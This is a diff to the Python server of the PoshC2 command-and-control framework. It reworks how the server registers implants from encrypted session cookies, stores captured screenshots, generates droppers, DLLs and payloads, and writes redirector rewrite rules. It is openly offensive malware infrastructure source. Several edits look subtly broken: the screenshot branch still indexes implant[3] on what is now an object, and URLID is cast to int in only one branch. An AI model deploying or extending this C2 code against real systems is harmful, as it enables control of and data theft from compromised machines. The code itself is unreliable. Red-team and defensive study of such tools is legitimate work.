@@ -10,7 +10,7 @@ from poshc2.server.Tasks import newTask
 from poshc2.server.Core import decrypt, encrypt, default_response, decrypt_bytes_gzip, number_of_days, process_mimikatz, print_bad
 from poshc2.Colours import Colours
 from poshc2.server.Payloads import Payloads
-from poshc2.server.Config import PoshProjectDirectory, ServerHeader, PayloadsDirectory, GET_404_Response, DownloadsDirectory, Database, PayloadCommsHost, SocksHost, PayloadCommsPort
+from poshc2.server.Config import PoshProjectDirectory, ServerHeader, PayloadsDirectory, GET_404_Response, DownloadsDirectory, Database, PayloadCommsHost, SocksHost
 from poshc2.server.Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, urlConfig, BindIP, BindPort
 from poshc2.server.Config import DownloadURI, Sounds, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken
 from poshc2.server.Config import Pushover_APIUser, EnableNotifications, DatabaseType
@@ -263,11 +263,11 @@ class MyHandler(BaseHTTPRequestHandler):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
                     decCookie = decrypt(KEY, cookieVal)
                     IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                    Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
-                    Proxy = Proxy.replace("\x00", "")
+                    Domain, User, Hostname, Arch, PID, URLID = decCookie.split(";")
+                    URLID = URLID.replace("\x00", "")
                     if "\\" in User:
                         User = User[User.index("\\") + 1:]
-                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, int(URLID))
                     newImplant.save()
                     newImplant.display()
                     newImplant.autoruns()
@@ -281,9 +281,9 @@ class MyHandler(BaseHTTPRequestHandler):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
                     decCookie = decrypt(KEY, cookieVal)
                     IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                    User, Domain, Hostname, Arch, PID, Proxy = decCookie.split(";")
-                    Proxy = Proxy.replace("\x00", "")
-                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
+                    User, Domain, Hostname, Arch, PID, URLID = decCookie.split(";")
+                    URLID = URLID.replace("\x00", "")
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
                     newImplant.save()
                     newImplant.display()
                     responseVal = encrypt(KEY, newImplant.PythonCore)
@@ -297,12 +297,12 @@ class MyHandler(BaseHTTPRequestHandler):
                         cookieVal = (self.cookieHeader).replace("SessionID=", "")
                         decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
                         decCookie = str(decCookie)
-                        Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
-                        Proxy = Proxy.replace("\x00", "")
+                        Domain, User, Hostname, Arch, PID, URLID = decCookie.split(";")
+                        URLID = URLID.replace("\x00", "")
                         IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                         if "\\" in str(User):
                             User = User[str(User).index('\\') + 1:]
-                        newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
+                        newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
                         newImplant.save()
                         newImplant.display()
                         newImplant.autoruns()
@@ -353,17 +353,17 @@ class MyHandler(BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length)
             logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data)
             now = datetime.datetime.now()
-            result = get_implants_all()
-            if not result:
+            all_implants = get_implants_all()
+            if not all_implants:
                 print_bad("Received post request but no implants in database... has the project been cleaned but you're using the same URLs?")
                 return
-            for i in result:
-                implantID = i[0]
-                RandomURI = i[1]
-                Hostname = i[3]
-                encKey = i[5]
-                Domain = i[11]
-                User = i[2]
+            for implant in all_implants:
+                implantID = implant.ImplantID
+                RandomURI = implant.RandomURI
+                Hostname = implant.Hostname
+                encKey = implant.Key
+                Domain = implant.Domain
+                User = implant.User
                 if RandomURI in self.path and cookieVal:
                     update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                     decCookie = decrypt(encKey, cookieVal)
@@ -398,7 +398,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     elif "get-screenshot" in executedCmd.lower():
                         try:
                             decoded = base64.b64decode(outputParsed)
-                            filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
+                            filename = implant[3] + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
                             output_file = open('%s%s.png' % (DownloadsDirectory, filename), 'wb')
                             print("Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
                             update_task(taskId, "Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
@@ -526,10 +526,10 @@ class MyHandler(BaseHTTPRequestHandler):
                 UriPath = str(self.path)
                 sharpurls = get_sharpurls().split(",")
                 sharplist = []
-                for i in sharpurls:
-                    i = i.replace(" ", "")
-                    i = i.replace("\"", "")
-                    sharplist.append("/" + i)
+                for implant in sharpurls:
+                    implant = implant.replace(" ", "")
+                    implant = implant.replace("\"", "")
+                    sharplist.append("/" + implant)
 
                 if [ele for ele in sharplist if(ele in UriPath)]:
                     try:
@@ -606,7 +606,7 @@ def newdb(db):
         print("Invalid DefaultSleep in config, please specify a time such as 50s, 10m or 1h")
         print(Colours.GREEN)
         sys.exit(1)
-    setupserver(PayloadCommsHost, gen_key().decode("utf-8"), DomainFrontHeader, DefaultSleep, KillDate, GET_404_Response, PoshProjectDirectory, PayloadCommsPort, QuickCommand, DownloadURI, "", "", "", Sounds, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken, Pushover_APIUser, EnableNotifications)
+    setupserver(PayloadCommsHost, gen_key().decode("utf-8"), DomainFrontHeader, DefaultSleep, KillDate, GET_404_Response, PoshProjectDirectory, QuickCommand, DownloadURI, "", "", "", Sounds, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken, Pushover_APIUser, EnableNotifications)
     rewriteFile = "%s/rewrite-rules.txt" % directory
     print("Creating Rewrite Rules in: " + rewriteFile)
     rewriteHeader = ["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none", "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off", "# Change IPs to point at C2 infrastructure below", "Define PoshC2 10.0.0.1", "Define SharpSocks 10.0.0.1"]
@@ -618,11 +618,9 @@ def newdb(db):
         outFile.close()
 
     C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                          C2[13], C2[11], "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
+    urlId = new_urldetails("default", C2.PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
+    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID = urlId)
 
-    new_urldetails("default", C2[1], C2[3], "", "", "", "")
     newPayload.CreateRaw()
     newPayload.CreateDroppers()
     newPayload.CreateDlls()
@@ -644,7 +642,7 @@ def existingdb(db):
     print("Using existing %s database / project" % db + Colours.GREEN)
     database_connect()
     C2 = get_c2server_all()
-    if ((C2[1] == PayloadCommsHost) and (C2[3] == DomainFrontHeader)):
+    if ((C2.PayloadCommsHost == PayloadCommsHost) and (C2.DomainFrontHeader == DomainFrontHeader)):
         qstart = "%squickstart.txt" % (PoshProjectDirectory)
         if os.path.exists(qstart):
             with open(qstart, 'r') as f:
@@ -657,9 +655,8 @@ def existingdb(db):
         os.rename("%spayloads" % PoshProjectDirectory, "%spayloads_old" % PoshProjectDirectory)
         os.makedirs("%spayloads" % PoshProjectDirectory)
         C2 = get_c2server_all()
-        newPayload = Payloads(C2[5], C2[2], PayloadCommsHost, DomainFrontHeader, C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18], C2[19], get_newimplanturl(), PayloadsDirectory)
-        new_urldetails("updated_host", PayloadCommsHost, C2[3], "", "", "", "")
+        urlId = new_urldetails("updated_host", PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID = urlId)
         update_item("PayloadCommsHost", "C2Server", PayloadCommsHost)
         update_item("QuickCommand", "C2Server", QuickCommand)
         update_item("DomainFrontHeader", "C2Server", DomainFrontHeader)
@@ -738,12 +735,12 @@ def main(args):
     print("")
     print(time.asctime() + " PoshC2 Server Started - %s:%s" % (BindIP, BindPort))
     from datetime import date, datetime
-    killdate = datetime.strptime(C2[5], '%d/%m/%Y').date()
+    killdate = datetime.strptime(C2.KillDate, '%d/%m/%Y').date()
     datedifference = number_of_days(date.today(), killdate)
     if datedifference < 8:
-        print(Colours.RED + ("\nKill Date is - %s - expires in %s days" % (C2[5], datedifference)))
+        print(Colours.RED + ("\nKill Date is - %s - expires in %s days" % (C2.KillDate, datedifference)))
     else:
-        print(Colours.GREEN + ("\nKill Date is - %s - expires in %s days" % (C2[5], datedifference)))
+        print(Colours.GREEN + ("\nKill Date is - %s - expires in %s days" % (C2.KillDate, datedifference)))
     print(Colours.END)
 
     if "https://" in PayloadCommsHost.strip():
